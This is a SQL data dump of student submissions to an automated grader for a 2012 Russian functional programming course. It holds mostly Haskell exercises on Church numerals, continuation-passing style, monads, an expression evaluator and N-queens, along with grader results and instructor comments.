(4381, 118, '63706456', '2012-11-29 06:33:32', 0, 'find cond (x:xs) = if cond x then (x,xs) else find cond xs\r\n\r\n(f >>> g) ls = let 	(l,r) = f ls \r\n			(h,t) = g r in \r\n			(l,(h:t))', 'Выражение имеет неправильное значение: let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]'),
(4382, 118, '63706456', '2012-11-29 06:35:11', 1, 'find cond (x:xs) = if cond x then (x,xs) else find cond xs\r\n\r\n(f >>> g) ls = let 	(l,r) = f ls \r\n			(h,t) = g r in \r\n			(l,(h:t))\r\n\r\n--let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]\r\n--непонятно, в чём ошибка и какой рез-т ожидается? (5,[20,25,2])\r\n\r\n     --- Собственно там же в тексте задачи написано, какой результата ожидается, (20, [25,2])  ', 'Выражение имеет неправильное значение: let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]'),
(4383, 116, '63706456', '2012-11-29 06:40:56', 1, 'toInt f = f (+1) 0', '<br/>Тесты успешно пройдены!'),
(4384, 117, '63706456', '2012-11-29 06:45:36', 0, 'inc g = (f x -> f (g f x))', 'Не удалось вычислить выражение "let c3 f x = f (f x) in toInt (inc c3)", проверьте правильность синтаксиса'),
(4385, 117, '63706456', '2012-11-29 06:47:57', 1, 'inc g = (f x -> f (g f x))\r\n--let c3 f x = f (f x) in toInt (inc c3)\r\n--ответ 3\r\n--видимо какие-то баги в системе', 'Не удалось вычислить выражение "let c3 f x = f (f x) in toInt (inc c3)", проверьте правильность синтаксиса'),
(4386, 118, '214982', '2012-11-29 06:51:43', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n(>>>) a1 a2 = (x -> a2 (snd (a1 x)))\r\nf = (find (>3)) >>> (find (>3))', '<br/>Тесты успешно пройдены!'),
(4387, 115, '63706456', '2012-11-29 06:57:55', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf ls = foldr1 (zipWith (+)) $ map (`find` ls) [(<5),(>10),(/=7)]', '<br/>Тесты успешно пройдены!'),
(4388, 111, '355679', '2012-11-29 06:58:16', 0, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving (Show, Eq)\n\n\n\neval (N n) varValues = n\n\neval (Add e1 e2) varValues = eval e1 varValues + eval e2 varValues\n\neval (Mult e1 e2) varValues = eval e1 varValues * eval e2 varValues\n\n\n\neval (Var x) varValues = snd (head (filter (==x) . fst varValues))\n\n\n', 'Не удалось вычислить выражение "eval (Add (Var [''x'']) (Mult (Var [''y'']) (N 3))) [([''x''], 5), ([''y''], 8)]", проверьте правильность синтаксиса'),
(4389, 111, '355679', '2012-11-29 07:02:09', 1, 'data Expr a = Var a | N Integer | Add (Expr a) (Expr a) | Mult (Expr a) (Expr a) deriving (Show, Eq)\r\n\r\n\r\n\r\neval (N n) varValues = n\r\n\r\neval (Add e1 e2) varValues = eval e1 varValues + eval e2 varValues\r\n\r\neval (Mult e1 e2) varValues = eval e1 varValues * eval e2 varValues\r\n\r\n\r\n\r\neval (Var x) varValues = snd (head (filter ((==x) . fst) varValues))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4390, 112, '355679', '2012-11-29 07:06:34', 1, 'data Expr a =\r\n\r\n			Var a |\r\n\r\n			N Integer |\r\n\r\n			Add (Expr a) (Expr a) |\r\n\r\n			Mult (Expr a) (Expr a) |\r\n\r\n			Let a Integer (Expr a)\r\n\r\n		deriving (Show, Eq)\r\n\r\n\r\n\r\neval (N n) varValues = n\r\n\r\neval (Add e1 e2) varValues = eval e1 varValues + eval e2 varValues\r\n\r\neval (Mult e1 e2) varValues = eval e1 varValues * eval e2 varValues\r\n\r\n\r\n\r\neval (Var x) varValues = snd (head (filter ((==x) . fst) varValues))\r\n\r\neval (Let var value expr) varValues = eval expr ((var,value):varValues)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4391, 111, '63706456', '2012-11-29 07:08:17', 1, 'data Expr var num = Add (Expr var num) (Expr var num) | Mult (Expr var num) (Expr var num) | N num | Var var\r\n\r\nfind ((a,b):xs) key = if a == key then b else find xs key\r\n\r\neval (N num) _ = num\r\neval (Var v) env = find env v\r\neval (Add e1 e2) env = (eval e1 env) + (eval e2 env)\r\neval (Mult e1 e2) env = (eval e1 env) * (eval e2 env)', '<br/>Тесты успешно пройдены!'),
(4392, 115, '5656962', '2012-11-29 07:10:51', 1, 'find cond [] = []\r\n\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\n\r\n\r\nf list = let \r\n\r\n			x = find (<5) list \r\n\r\n			y = find (>10) list\r\n\r\n			z = find (/=7) list\r\n\r\n		in if (length(x) == 0 || length(y) == 0 || length(z) == 0) then [] else [head x + head y + head z]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4393, 112, '63706456', '2012-11-29 07:11:09', 1, 'data Expr var num = Add (Expr var num) (Expr var num) | Mult (Expr var num) (Expr var num) | N num | Var var | Let var num (Expr var num) \r\n\r\nfind ((a,b):xs) key = if a == key then b else find xs key\r\n\r\neval (N num) _ = num\r\neval (Var v) env = find env v\r\neval (Add e1 e2) env = (eval e1 env) + (eval e2 env)\r\neval (Mult e1 e2) env = (eval e1 env) * (eval e2 env)\r\neval (Let v n expr) env = eval expr ((v,n):env)', '<br/>Тесты успешно пройдены!'),
(4394, 113, '355679', '2012-11-29 07:13:01', 2, 'sum_cps [] f = f 0;\r\n\r\nsum_cps (x:xs) f = f (sum_cps xs (+x))\r\n   --- Нет, это не по условию (в частности потому что в этом правиле у вас не хвостовая рекурсия)\r\n   --- Давайте так, вы решите такую задачу: написать функцию sumsin_sps которая для данного n\r\n   --- вычисляет sin 1 + sin 2 + sin 3 + ... + sin n и при этом использует constinuation passing style.\r\n   --- И выложите ее сюда же, как решение этой задачи. И я ее тогда зачту. \r\n\r\ntest1 = sum_cps [1,2,3] id == 6\r\n\r\ntest2 = sum_cps [1,2,3] (^2) == 36\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4395, 113, '63706456', '2012-11-29 07:16:01', 1, 'sum_cps (x:xs) f = sum_cps xs (f.(x+))\r\nsum_cps [] f = f 0', '<br/>Тесты успешно пройдены!'),
(4396, 114, '63706456', '2012-11-29 07:22:38', 1, 'triangle1 n = 	do 	x <- [1..n]\r\n			y <- [1..x]\r\n			return y\r\n\r\ntriangle2 n = [1..n] >>= x -> [1..x]', '<br/>Тесты успешно пройдены!'),
(4397, 111, '5772638', '2012-11-29 07:32:56', 1, 'data Expr= N Int| Var String| Add (Expr) (Expr)| Mult (Expr) (Expr) deriving (Show)\r\n\r\nfind t (x:xs)=if t==fst x then snd x else find t xs\r\n\r\neval (N a) xs=a\r\neval (Var a) xs= find a xs\r\neval (Add left right) xs= eval left xs + eval right xs\r\neval (Mult left right) xs= eval left xs * eval right xs', '<br/>Тесты успешно пройдены!'),
(4398, 113, 'erwert', '2012-11-29 07:34:48', 1, 'sum_cps [] f = f 0\r\nsum_cps (h:hs) f = sum_cps hs (f.(+h))', '<br/>Тесты успешно пройдены!'),
(4399, 112, '5772638', '2012-11-29 07:40:28', 1, 'data Expr= N Int| Var String| Add (Expr) (Expr)| Mult (Expr) (Expr)| Let String Int (Expr) deriving (Show)\r\n\r\nfind t (x:xs)=if t==fst x then snd x else find t xs\r\n\r\neval (N a) xs=a\r\neval (Var a) xs= find a xs\r\neval (Let x a exp) xs= eval (exp) ((x,a):xs)\r\neval (Add left right) xs= eval left xs + eval right xs\r\neval (Mult left right) xs= eval left xs * eval right xs', '<br/>Тесты успешно пройдены!'),
(4400, 114, '355679', '2012-11-29 07:54:59', 1, 'triangle1 n = return ([1..n] >>= (x -> [1..x]))\r\n\r\n-- это задание просто чтобы потренироваться или я ничего не понял?\r\n-- тут же можно просто убрать return и всё будет работать так же..\r\n-- я так понял, смысл использовать return, в принципе, появляется только тогда,\r\n-- когда мы там как-то хитро работаем с моналами, которых я не знаю пока..\r\n  --- Да, чтобы потренироваться.. Но, кстати, лучше \r\n  ---   [1..n] >>= x -> [1..x] >>= y -> return y\r\n  --- Наверное надо надо бвло дать немного более сложный пример, например\r\n  ---  [sin 1, sin 1, sin 2, sin 1, sin 2, sin 3, ...]\r\n  --- Тогда смысл return будет очень очевидным.\r\n  --- return это совсем не хитрая, а наоборот, как правило,очень простая функция, которая преобразует\r\n  --- значение в монаду. Например, как мы говорили, для Maybe это просто return x = Just x\r\n  --- Ну, про это мы еще поговорим в следуюший раз.\r\n\r\n\r\n\r\ntriangle2 n = do\r\n\r\n	n1 <- [1..n]\r\n\r\n	[1..n1]\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4401, 117, '5477377', '2012-11-29 08:05:30', 1, 'toInt f = f (+1) 0\r\ninc g = (f-> f.(g f))', '<br/>Тесты успешно пройдены!'),
(4402, 116, '355679', '2012-11-29 08:31:58', 1, 'toInt f = f (+1) 0\r\n\r\ntestToInt = toInt (f x -> f (f (f x))) == 3\r\n\r\n\r\n\r\ninc f = (f1 x -> f1 (f f1 x))\r\n\r\ntestInc = toInt (inc (f x -> f (f (f x)))) == 4\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4403, 117, '355679', '2012-11-29 08:32:17', 1, 'toInt f = f (+1) 0\r\n\r\ntestToInt = toInt (f x -> f (f (f x))) == 3\r\n\r\n\r\n\r\ninc f = (f1 x -> f1 (f f1 x))\r\n\r\ntestInc = toInt (inc (f x -> f (f (f x)))) == 4\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4404, 111, '442421', '2012-11-29 08:46:50', 1, '\r\ndata Expr = N Integer | Var String | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\neval (Var s) x = getValue s x\r\n\r\n\r\neval (N i) _ = i\r\neval (Add a b) x = eval a x + eval b x\r\neval (Mult a b) x = eval a x * eval b x\r\n\r\n\r\ngetValue s [] =  error "value not found"\r\ngetValue s ((n,v):xs) = if s==n then v else getValue s xs', '<br/>Тесты успешно пройдены!'),
(4405, 115, 'erwert', '2012-11-29 08:53:13', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\nf l =  if (foldl (a b -> if b == [] then True else a) False r) then [] else [foldl (a b -> head b + a) 0 r]\r\n	where r = ((find (<5) l) : (find (>10) l) : (find (/=7) l) : [])', '<br/>Тесты успешно пройдены!'),
(4406, 115, '355679', '2012-11-29 08:58:03', 1, 'find cond [] = []\r\n\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\n\r\n\r\nf xs = let {\r\n\r\n		res1 = find (<5) xs;\r\n\r\n		res2 = find (>10) xs;\r\n\r\n		res3 = find (/=7) xs;\r\n\r\n		res = res1 ++ res2 ++ res3;\r\n\r\n	} in (\r\n\r\n		if length res /= 3 then [] else [sum res]\r\n\r\n	)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4407, 114, 'erwert', '2012-11-29 09:03:21', 1, 'triangle1 n = [1..n] >>= (x -> [1..x] >>= return)\r\ntriangle2 n = \r\n	do  \r\n	a <- [1..n]\r\n	b <- [1..a]\r\n	return b', '<br/>Тесты успешно пройдены!'),
(4408, 112, '442421', '2012-11-29 09:03:58', 1, '\r\ndata Expr = N Integer | Var String | Add Expr Expr | Mult Expr Expr|Let String Integer Expr deriving Show\r\n\r\n\r\neval (Var s) x = getValue s x\r\n\r\n\r\neval (N i) _ = i\r\neval (Add a b) x = eval a x + eval b x\r\neval (Mult a b) x = eval a x * eval b x\r\n\r\neval (Let var val expr ) x = eval expr ((var,val):x)\r\n\r\n\r\ngetValue s [] =  error "value not found"\r\ngetValue s ((n,v):xs) = if s==n then v else getValue s xs', '<br/>Тесты успешно пройдены!'),
(4409, 108, '3607492', '2012-11-29 09:28:16', 1, '-- prints -- для наглядности :)\r\n\r\nimport Data.List\r\n\r\ncheck _ 0 _ = [[]]\r\ncheck h v f = [(x,v):xs|x<-[1..h],f x v,xs<-check h (v-1) (p t -> f p t && p/=x && t/= v && ( abs (p-x) /= abs (t-v)))]\r\n\r\n\r\nqueens hor ver = {-prints hor ver-} (check hor ver (x y-> True)) \r\n\r\nprints _ _[] = []\r\nprints h w (x:xs) = (showQ (sortBy ((x,y) (x1,y1) -> if (x>x1) then LT else GT ) x) h w)++ "\r\n\r\n" ++ prints h w xs\r\n\r\nprintH _ 0 _ = ""\r\nprintH (t,x) w h= if (t/=h) then "□"++printH (t,x-1) (w-1) h else if (x/=1) then "□"++printH (t,x-1) (w-1) h else "■"++printH (t,-1) (w-1) h\r\n\r\nshowQ [] _ _ = ""\r\nshowQ ((x,y):xs) h w= if (x>h) then (printH (x,y) w h)++"\r\n"++ (showQ xs (h) w) else if (x<h) then (printH (x,y) w h)++"\r\n"++ (showQ ((x,y):xs) (h-1) w)   else (printH (x,y) w h) ++ "\r\n" ++ (showQ xs (h-1) w)\r\n', '<br/>Тесты успешно пройдены!'),
(4410, 111, '4837959', '2012-11-29 09:51:12', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\neval (Var x) vars = snd $ head $ filter ((var, val) -> var == x) vars\r\n\r\neval (N n) vars = n\r\n\r\neval (Add e1 e2) vars = eval e1 vars + eval e2 vars\r\n\r\neval (Mult e1 e2) vars = eval e1 vars * eval e2 vars\r\n\r\n\r\n\r\ntest = eval (Add (Var "x") (Mult (Var "y") (N 3))) [("x", 5), ("y", 8)]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4411, 116, '4837959', '2012-11-29 09:51:26', 1, 'toInt churchNum = churchNum (	 -> t + 1) 0\r\n\r\n\r\n\r\ntest = toInt (f x -> f (f (f x)))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4412, 121, 'Deutsche', '2012-11-29 12:42:18', 1, '﻿// Задача 32.1 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\n\r\n\r\nnamespace _32._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static UInt64 fact_cps(UInt64 n, Func<UInt64, UInt64> f)\r\n\r\n        {\r\n\r\n            if (n == 1)\r\n\r\n                return f(n);\r\n\r\n            else\r\n\r\n                return fact_cps(n-1, t => f(t*n));\r\n\r\n        }\r\n\r\n\r\n\r\n        // функция, которую хотим применить в конце - по умолчанию id, т.к. хотим просто факториал\r\n\r\n        public static UInt64 id(UInt64 a)\r\n\r\n        {\r\n\r\n            return a;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            UInt64 n = 0;\r\n\r\n            bool T = true;\r\n\r\n            Console.WriteLine("Factorial computing with continuation passing style");\r\n\r\n            while (T)\r\n\r\n            {\r\n\r\n                Console.Write("Input n>=0 : ");\r\n\r\n                n = Convert.ToUInt64(Console.ReadLine());\r\n\r\n                if (n == 0)\r\n\r\n                    Console.WriteLine("Its factorial : 1");\r\n\r\n                else\r\n\r\n                    Console.WriteLine("Its factorial : " + fact_cps(n, id));\r\n\r\n            } \r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4413, 108, 'erwert', '2012-11-29 17:21:28', 1, 'queens n k = go n k (x -> True)\r\ngo n 0 c = [[]]\r\ngo n k c = [(a, b):hs | (a, b) <- [(k,j) | j <- [1..n], c (k,j)], hs <- go n (k-1) ((x1, x2) -> c (x1, x2) && (a /= x1 && b /= x2 && abs (x2 - b) /= abs (x1 - a)))]', '<br/>Тесты успешно пройдены!'),
(4414, 108, 'tonyo', '2012-11-29 17:56:18', 2, '  --- У вас на самом деле, в одном месте очень неэффективно написано (и по этому не укладывается в\r\n  --- ограничения по времени в системе тестирования.) И причина неэффективности очень простая - вы на каждом\r\n  --- шаг подбираете допустимую горизонталь и вертикаль для очередного ферзя. Но вертикаль подбирать не надо!\r\n  --- Из условия следует, что первый ферзь всегда стоит на первой вертикали, второй ферзь - на второй вертикали\r\n  --- и т.д. Те перебором надо искать только горизонталь. Попробуйте так сделать, пожалуйста. \r\nqueens n k = queens1 n k 1 (	 -> False)\r\n\r\nqueens1 n k min f = if min > k\r\n                    then [[]]\r\n                    else [(i,j):xs | i <- [min..k], j <- [1..n], not (f (i,j)),\r\n                      xs <- queens1 n k (min+1) (x -> let fx = fst x; sx = snd x in  \r\n                        f x || fx == i || sx == j || fx + sx == i + j || fx + j == sx + i) ] ', 'Не удалось вычислить выражение "length (queens 8 8)", проверьте правильность синтаксиса'),
(4415, 119, '2118411', '2012-11-29 19:59:28', 1, '  --- На самом деле, я имел в виду, что парами пользоваться тоже нельзя (потому что\r\n  --- Черч и Клини решали эту задачу без всяких пар, для чистого лямбда исчисления,\r\n  --- и мы тоже попробуем это сделать.) Я сейчас дописал это, как дополнительное условие.\r\n  --- Задача засчитана (тем более вам это все равно:), но если придумаете решение без пар\r\n  --- - выложите, пожалуйста, просто интересно будет посмотреть.\r\ntoInt ch = ch (+1) 0\r\ninc ch = (f x->f (ch f x))\r\n\r\nst = (f x->x, f x->x)\r\nnext p = (snd p, inc (snd p))\r\ndec n = fst (n next st)\r\n', '<br/>Тесты успешно пройдены!'),
(4416, 119, '44060', '2012-11-29 20:09:54', 1, '  --- На самом деле, я имел в виду, что парами пользоваться тоже нельзя (потому что\r\n  --- Черч и Клини решали эту задачу без всяких пар, для чистого лямбда исчисления,\r\n  --- и мы тоже попробуем это сделать.) Я сейчас дописал это, как дополнительное условие.\r\n  --- Задача засчитана, но если придумаете решение без пар\r\n  --- - выложите, пожалуйста, просто интересно будет посмотреть.\r\n\r\ntoInt churchN = churchN (+1) 0\r\ndec x f y = snd (x func (id, y))\r\n	where\r\n		func (h,y) = (f,h y)', '<br/>Тесты успешно пройдены!'),
(4417, 119, '12206137', '2012-11-29 20:12:15', 1, '  --- На самом деле, я имел в виду, что парами пользоваться тоже нельзя (потому что\r\n  --- Черч и Клини решали эту задачу без всяких пар, для чистого лямбда исчисления,\r\n  --- и мы тоже попробуем это сделать.) Я сейчас дописал это, как дополнительное условие.\r\n  --- ОК, засчитано (тем более вам это все равно:), но если придумаете решение без пар\r\n  --- - выложите, пожалуйста, просто интересно будет посмотреть.\r\ntoInt chNum = chNum (+ 1) 0\r\n\r\ndec num f x =\r\n    let newF (g, x) = (f, g x) in\r\n    snd $ num newF (id, x)\r\n', '<br/>Тесты успешно пройдены!'),
(4418, 122, '517309', '2012-11-29 21:24:54', 0, 'eval _ [] [] = 5', 'Не удалось вычислить выражение "eval (LetFunc [''F''] [''X''] (Var [''X'']) (Call "F" (Num 5))) [] []", проверьте правильность синтаксиса'),
(4419, 122, '2118411', '2012-11-29 22:03:48', 0, 'data Expr = Num Integer | Add Expr Expr | Mult Expr Expr | Var String | Let String Integer Expr\r\n        | LetFunc String String Expr Expr | Call String Expr\r\n        deriving Show\r\n\r\neval (Num num) _ _ = num\r\neval (Var x) env fEnv\r\n        | l == 0 = error $"Variable " ++ x ++ " not defined!"\r\n        | otherwise = head tmp\r\n        where\r\n                l = length tmp\r\n                tmp = [b|(a,b)<-env, a==x]\r\n\r\neval (Add e1 e2) env fEnv = eval e1 env fEnv + eval e2 env fEnv\r\neval (Mult e1 e2) env fEnv = eval e1 env fEnv * eval e2 env fEnv\r\neval (Let x xval e) env fEnv = eval e ((x,xval):env) fEnv\r\neval (LetFunc name var body e) env fEnv = eval e env ((name, (var, body)):fEnv)\r\neval (Call name e) env fEnv\r\n        | length funcs == 0 = error $"Function "++ name ++ " not defined!"\r\n        | otherwise = eval body ((var,tmp):env) fEnv\r\n        where\r\n                tmp = eval e env fEnv\r\n                (var, body) = head funcs\r\n                funcs = [(v,b)|(n,(v,b))<-fEnv, n==name]\r\n', 'Не удалось вычислить выражение "eval (LetFunc [''F''] [''X''] (Var [''X'']) (Call "F" (Num 5))) [] []", проверьте правильность синтаксиса'),
(4420, 122, '2118411', '2012-11-29 22:05:13', 0, 'data Expr = Num Integer | Add Expr Expr | Mult Expr Expr | Var String | Let String Integer Expr\r\n\n        | LetFunc String String Expr Expr | Call String Expr\r\n\n        deriving Show\r\n\n\r\n\neval (Num num) _ _ = num\r\n\neval (Var x) env fEnv\r\n\n        | l == 0 = error $"Variable " ++ x ++ " not defined!"\r\n\n        | otherwise = head tmp\r\n\n        where\r\n\n                l = length tmp\r\n\n                tmp = [b|(a,b)<-env, a==x]\r\n\n\r\n\neval (Add e1 e2) env fEnv = eval e1 env fEnv + eval e2 env fEnv\r\n\neval (Mult e1 e2) env fEnv = eval e1 env fEnv * eval e2 env fEnv\r\n\neval (Let x xval e) env fEnv = eval e ((x,xval):env) fEnv\r\n\neval (LetFunc name var body e) env fEnv = eval e env ((name, (var, body)):fEnv)\r\n\neval (Call name e) env fEnv\r\n\n        | length funcs == 0 = error $"Function "++ name ++ " not defined!"\r\n\n        | otherwise = eval body ((var,tmp):env) fEnv\r\n\n        where\r\n\n                tmp = eval e env fEnv\r\n\n                (var, body) = head funcs\r\n\n                funcs = [(v,b)|(n,(v,b))<-fEnv, n==name]\r\n\n\n', 'Не удалось вычислить выражение "eval (LetFunc [''F''] [''X''] (Var [''X'']) (Call "F" (Num 5))) [] []", проверьте правильность синтаксиса'),
(4421, 122, '2118411', '2012-11-29 22:06:25', 1, 'data Expr = Num Integer | Add Expr Expr | Mult Expr Expr | Var String | Let String Integer Expr | LetFunc String String Expr Expr | Call String Expr deriving Show\r\n\r\n\r\n\r\neval (Num num) _ _ = num\r\n\r\neval (Var x) env fEnv\r\n\r\n        | l == 0 = error $"Variable " ++ x ++ " not defined!"\r\n\r\n        | otherwise = head tmp\r\n\r\n        where\r\n\r\n                l = length tmp\r\n\r\n                tmp = [b|(a,b)<-env, a==x]\r\n\r\n\r\n\r\neval (Add e1 e2) env fEnv = eval e1 env fEnv + eval e2 env fEnv\r\n\r\neval (Mult e1 e2) env fEnv = eval e1 env fEnv * eval e2 env fEnv\r\n\r\neval (Let x xval e) env fEnv = eval e ((x,xval):env) fEnv\r\n\r\neval (LetFunc name var body e) env fEnv = eval e env ((name, (var, body)):fEnv)\r\n\r\neval (Call name e) env fEnv\r\n\r\n        | length funcs == 0 = error $"Function "++ name ++ " not defined!"\r\n\r\n        | otherwise = eval body ((var,tmp):env) fEnv\r\n\r\n        where\r\n\r\n                tmp = eval e env fEnv\r\n\r\n                (var, body) = head funcs\r\n\r\n                funcs = [(v,b)|(n,(v,b))<-fEnv, n==name]\r\n\r\n\r\n', 'Не удалось вычислить выражение "eval (LetFunc [''F''] [''X''] (Var [''X'']) (Call "F" (Num 5))) [] []", проверьте правильность синтаксиса'),
(4422, 126, '2118411', '2012-11-29 22:12:21', 1, 'Пусть есть две различные нормальные формы f1 и f2, которые получили из f применением бета-редукции.\r\nВ силу конфлюентности бета-редукции мы можем применить какое-то число раз бета-редукцию к f1 и получить f4, которое получается и из f2 путём применения бета-редукции. А это значит что мы могли применить бета-редукцию к нормальной форме, которая по определению не позволяет этого. Таким образом предположение о существовании двух различных нормальных форм ложно.', '<br/>Тесты успешно пройдены!'),
(4423, 123, '3431532', '2012-11-30 05:19:01', 1, 'find cond [] = Nothing\r\nfind cond (x:xs) = if (cond x) then Just x else find cond xs\r\n\r\nf ls =  do  x <- find (<5)  ls;\r\n			y <- find (>10) ls;\r\n			z <- find (/=7) ls;\r\n			return (x + y + z)', '<br/>Тесты успешно пройдены!'),
(4424, 124, '3431532', '2012-11-30 05:51:44', 1, 'downUp x = printElements ([-x..(-1)]++[2..x])\r\n\r\nprintElements [] = return ()\r\nprintElements (x:xs) = do print (abs x)\r\n                          printElements xs', '<br/>Тесты успешно пройдены!'),
(4425, 127, '3431532', '2012-11-30 06:00:38', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\nf >>>= g = 	 -> g (fst (f t)) (snd (f t))\r\n  --- ОК, но только лучше, конечно, не вызывать f t два раза\r\nf = find (>3) >>>= (x -> find (>x))', '<br/>Тесты успешно пройдены!'),
(4426, 122, '517309', '2012-11-30 06:08:38', 3, 'data Expr = Num Integer | Add Expr Expr | Mult Expr Expr | Var String | Let String Integer Expr | LetFunc String String Expr Expr | Call String Expr deriving Show\r\n\r\neval (Num num) _ _ = num\r\neval (Var x) env fEnv\r\n        | l == 0 = error $"V " ++ x ++ "!"\r\n\r\n        | otherwise = head tmp\r\n\r\n        where\r\n\r\n                l = length tmp\r\n\r\n                tmp = [b|(a,b)<-env, a==x]\r\n\r\n\r\n\r\neval (Add e1 e2) env fEnv = eval e1 env fEnv + eval e2 env fEnv\r\n\r\neval (Mult e1 e2) env fEnv = eval e1 env fEnv * eval e2 env fEnv\r\n\r\neval (Let x xval e) env fEnv = eval e ((x,xval):env) fEnv\r\n\r\neval (LetFunc name var body e) env fEnv = eval e env ((name, (var, body)):fEnv)\r\n\r\neval (Call name e) env fEnv\r\n\r\n        | length funcs == 0 = error $"Function "++ name ++ " not defined!"\r\n\r\n        | otherwise = eval body ((var,tmp):env) fEnv\r\n\r\n        where\r\n\r\n                tmp = eval e env fEnv\r\n\r\n                (var, body) = head funcs\r\n\r\n                funcs = [(v,b)|(n,(v,b))<-fEnv, n==name]\r\n', '<br/>Тесты успешно пройдены!'),
(4427, 107, '5772638', '2012-11-30 07:25:45', 2, '  --- Нет, тут несмого сложнее все записывется..\r\ndata LogExpr= X | T | F | And (LogExpr) (LogExpr)| Or (LogExpr) (LogExpr)| Not (LogExpr) deriving (Show)\r\n\r\ninstance Eq LogExpr where\r\n     LogExpr a==LogExpr b= eval a ==eval b\r\n\r\n\r\neval (X)=True||False\r\neval (T ) = True\r\neval (F ) = False\r\neval (And (left) (right)) = eval(left) && eval(right)\r\neval (Or (left) (right)) = eval(left) || eval(right)\r\neval (Not ex) = not (eval(ex))', 'Не удалось вычислить выражение "Or X (Not X) == T", проверьте правильность синтаксиса'),
(4428, 108, '3431532', '2012-11-30 07:40:21', 1, 'allList x 0 cond = [[]]\r\nallList x y cond = [(a,aa):xs | (a, aa)<-[(r,e) | r<-[y..y], e<-[1..x]], cond (a,aa), xs<-allList x (y-1) ((t,tt) -> (cond (t,tt)) && t /= a && tt /= aa && abs (t-a) /= abs (tt-aa))]\r\n\r\nqueens a b = (allList a b (	 -> True))', '<br/>Тесты успешно пройдены!'),
(4429, 124, 'tonyo', '2012-11-30 12:08:36', 1, 'downUp n =  if n == 1\r\n            then print 1\r\n            else do\r\n              print n\r\n              downUp (n-1)\r\n              print n\r\n', '<br/>Тесты успешно пройдены!'),
(4430, 120, '355679', '2012-11-30 12:41:54', 1, 'data Expr = Expr Expr Expr | Var String\r\n\r\n\r\n\r\ninstance Show Expr where\r\n\r\n	show (Var a) = a\r\n\r\n	show (Expr e1 e2) = "( " ++ (show e1) ++ " ) -> ( " ++ (show e2) ++ " )"\r\n\r\n\r\n\r\neval (Var a) values = (snd . head) (filter ((==a).fst) values)\r\n\r\neval (Expr e1 e2) values = let {\r\n\r\n		a = eval e1 values;\r\n\r\n		b = eval e2 values;\r\n\r\n	} in (\r\n\r\n		b || (not a)\r\n\r\n	)\r\n\r\n\r\n\r\nfetchVars e = fetchVars'' e []\r\n\r\n\r\n\r\nfetchVars'' (Var a) res = if length (filter (==a) res) > 0 then res else a:res\r\n\r\nfetchVars'' (Expr e1 e2) res = fetchVars'' e2 (fetchVars'' e1 res)\r\n\r\n\r\n\r\nallPossibleValues 0 = [[]]\r\n\r\nallPossibleValues n = foldr\r\n\r\n	(x res ->\r\n\r\n		(True : x) : (False : x) : res\r\n\r\n	)\r\n\r\n	[]\r\n\r\n	(allPossibleValues (n - 1))\r\n\r\n\r\n\r\nallPossibleVarValues vars = foldr\r\n\r\n	(values res ->\r\n\r\n		(zip vars values) : res\r\n\r\n	)\r\n\r\n	[]\r\n\r\n	(allPossibleValues (length vars))\r\n\r\n\r\n\r\nisTautology e = foldr\r\n\r\n	(values res ->\r\n\r\n		res && eval e values\r\n\r\n	)\r\n\r\n	True\r\n\r\n	(allPossibleVarValues (fetchVars e))\r\n\r\n\r\n\r\n-- buildExpression\r\n\r\nbe a b = Expr (Var a) (Var b)\r\n\r\n\r\n\r\ntestExpr1 = be "a" "a"\r\n\r\ntestExpr2 = Expr (Expr (be "a" "b") (be "b" "c")) (be "a" "c")\r\n\r\n\r\n\r\ntest = isTautology testExpr1 && not (isTautology testExpr2)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4431, 106, '355679', '2012-11-30 12:42:20', 1, 'import Data.Maybe\r\n\r\n\r\n\r\nfindMajor xs = majorOrNothing (findMajorInner xs) xs\r\n\r\n\r\n\r\nfindMajorInner (x:xs) = findMajor'' 1 x xs\r\n\r\n\r\n\r\nfindMajor'' _ num [] = num\r\n\r\nfindMajor'' count num (x:xs) = \r\n\r\n	if num == x then\r\n\r\n		findMajor'' (count + 1) num xs\r\n\r\n	else if count > 0 then\r\n\r\n		findMajor'' (count - 1) num xs\r\n\r\n	else\r\n\r\n		findMajor'' 1 x xs\r\n\r\n\r\n\r\n-- понятно, что это тоже выполняется за О(n) по времени и за О(1) по памяти.\r\n\r\n-- в принципе, это можно переписать явно с помощью одного прохода по списку\r\n\r\n-- и с использованием двух переменных: для текущей длины и для количества\r\n\r\n-- вхождений переменной. итого 2 прохода по списку и 3 переменных: переменную\r\n\r\n-- count можно переиспользовать на втором этапе: она боле не нужна.\r\n\r\nmajorOrNothing num xs =\r\n\r\n	if length (filter (==num) xs) > (length xs) `div` 2 then\r\n\r\n		Just num\r\n\r\n	else\r\n\r\n		Nothing\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
